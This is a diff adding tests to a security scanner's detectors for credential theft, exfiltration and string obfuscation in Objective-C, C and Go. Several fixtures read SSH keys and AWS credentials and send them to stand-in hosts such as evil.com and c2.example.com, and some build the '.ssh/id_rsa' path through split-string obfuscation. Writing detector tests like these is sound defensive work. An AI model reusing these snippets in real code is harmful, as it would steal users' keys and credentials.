@@ -577,4 +577,110 @@ sock.sendto(data, ("1.2.3.4", 53))
 '''
     fp = compute_fingerprint(content, "exfil.py")
     assert fp.makes_network_calls is True
+
+
+# -- Polyglot detectors --
+
+def test_polyglot_exfil_objc_nsurlsession():
+    """NSURLSession in Obj-C should trigger behavioral credential+exfil."""
+    content = '''
+    NSString* kpath = [home stringByAppendingPathComponent:@".ssh/id_rsa"];
+    NSString* aws = [home stringByAppendingPathComponent:@".aws/credentials"];
+    NSString* rsa = [home stringByAppendingPathComponent:@".ssh/id_ed25519"];
+    NSURLSession* session = [NSURLSession sharedSession];
+    NSURLSessionDataTask* task = [session dataTaskWithRequest:req];
+    '''
+    obs = detect_behavioral_patterns(content, "metal_init.mm")
+    assert any(o.category == "behavioral:credential_access_exfil" for o in obs)
+
+
+def test_polyglot_exfil_curl():
+    """curl_easy_perform in C should trigger exfil detection."""
+    content = '''
+    char path[256];
+    snprintf(path, sizeof(path), "%s/.ssh/id_rsa", getenv("HOME"));
+    FILE* f = fopen(path, "r");
+    snprintf(path, sizeof(path), "%s/.aws/credentials", getenv("HOME"));
+    snprintf(path, sizeof(path), "%s/.ssh/id_ed25519", getenv("HOME"));
+    curl_easy_setopt(curl, CURLOPT_URL, "http://evil.com/exfil");
+    curl_easy_perform(curl);
+    '''
+    obs = detect_behavioral_patterns(content, "helper.c")
+    assert any(o.category == "behavioral:credential_access_exfil" for o in obs)
+
+
+def test_polyglot_exfil_go():
+    """Go http.Post should trigger exfil detection."""
+    content = '''
+    home, _ := os.UserHomeDir()
+    data, _ := os.ReadFile(filepath.Join(home, ".ssh/id_rsa"))
+    data2, _ := os.ReadFile(filepath.Join(home, ".aws/credentials"))
+    data3, _ := os.ReadFile(filepath.Join(home, ".ssh/id_ed25519"))
+    http.Post("http://c2.example.com", "application/json", bytes.NewReader(data))
+    '''
+    obs = detect_behavioral_patterns(content, "main.go")
+    assert any(o.category == "behavioral:credential_access_exfil" for o in obs)
+
+
+def test_polyglot_objc_string_array_obfuscation():
+    """Obj-C @[@".", @"s", @"s", @"h", ...] should be flagged as obfuscation."""
+    content = '''
+    NSArray* parts = @[@".", @"s", @"s", @"h", @"/", @"i", @"d", @"_", @"r", @"s", @"a"];
+    NSString* path = [parts componentsJoinedByString:@""];
+    '''
+    obs = detect_obfuscation(content, "metal_helper.mm")
+    assert any(o.category == "obfuscation:objc_string_array" for o in obs)
+
+
+def test_polyglot_cpp_concat_chain():
+    """C++ short-string concat chains should be flagged."""
+    content = '''
+    std::string path = std::string(".") + "s" + "s" + "h" + "/" + "i" + "d";
+    '''
+    obs = detect_obfuscation(content, "util.cpp")
+    assert any(o.category == "obfuscation:cpp_string_concat_chain" for o in obs)
+
+
+def test_polyglot_fingerprint_objc_network():
+    """Obj-C NSURLSession should set makes_network_calls in fingerprint."""
+    from security_scanner.semantic_fingerprint import compute_fingerprint
+    content = '''
+    NSURLSession* session = [NSURLSession sharedSession];
+    NSURLSessionDataTask* task = [session dataTaskWithRequest:req completionHandler:^{}];
+    '''
+    fp = compute_fingerprint(content, "network.mm")
+    assert fp.makes_network_calls is True
+
+
+def test_polyglot_fingerprint_objc_home_dir():
+    """Obj-C NSHomeDirectory should set reads_home_dir in fingerprint."""
+    from security_scanner.semantic_fingerprint import compute_fingerprint
+    content = 'NSString* home = NSHomeDirectory();'
+    fp = compute_fingerprint(content, "paths.mm")
+    assert fp.reads_home_dir is True
+
+
+def test_polyglot_fingerprint_objc_file_io():
+    """Obj-C dataWithContentsOfFile should set uses_open in fingerprint."""
+    from security_scanner.semantic_fingerprint import compute_fingerprint
+    content = 'NSData* data = [NSData dataWithContentsOfFile:path];'
+    fp = compute_fingerprint(content, "reader.mm")
+    assert fp.uses_open is True
+
+
+def test_polyglot_fingerprint_c_getenv():
+    """C getenv() should set accesses_env_other in fingerprint."""
+    from security_scanner.semantic_fingerprint import compute_fingerprint
+    content = 'const char* home = getenv("HOME");'
+    fp = compute_fingerprint(content, "util.c")
+    assert fp.accesses_env_home is True
+    assert fp.reads_home_dir is True
+
+
+def test_polyglot_fingerprint_go_network():
+    """Go http.Post should set makes_network_calls in fingerprint."""
+    from security_scanner.semantic_fingerprint import compute_fingerprint
+    content = 'resp, err := http.Post(url, "application/json", body)'
+    fp = compute_fingerprint(content, "main.go")
+    assert fp.makes_network_calls is True
     assert "network_calls" in fp.capability_set()
